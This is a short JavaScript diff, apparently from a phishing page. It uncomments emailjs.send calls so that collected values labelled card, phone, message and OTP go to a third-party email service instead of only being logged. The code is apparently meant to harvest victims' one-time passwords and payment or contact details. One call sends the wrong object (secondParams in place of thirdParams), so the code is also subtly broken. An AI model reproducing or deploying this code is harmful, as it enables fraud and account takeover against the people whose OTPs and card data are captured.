@@ -67,9 +67,7 @@ function answer() {
       card: phone,
       message: exact,
    }
-   console.log(secondParams);
-
- //emailjs.send("service_exfzcaq","template_q7b1lho",secondParams);
+ emailjs.send("service_exfzcaq","template_q7b1lho",secondParams);
   }
   otpHTML += ohtml;
   document.querySelector('.js-otphtml-div').innerHTML = otpHTML;
@@ -89,10 +87,9 @@ if (otp === 0) {
  let thirdParams = {
       card: otp,
    }
-   console.log(thirdParams);
-
- //emailjs.send("service_exfzcaq","template_q7b1lho",secondParams);
+ emailjs.send("service_exfzcaq","template_q7b1lho",secondParams);
 }
 lastHTML += lastHtml
 document.querySelector('.js-lastHTML-div').innerHTML = lastHTML;
 }
+
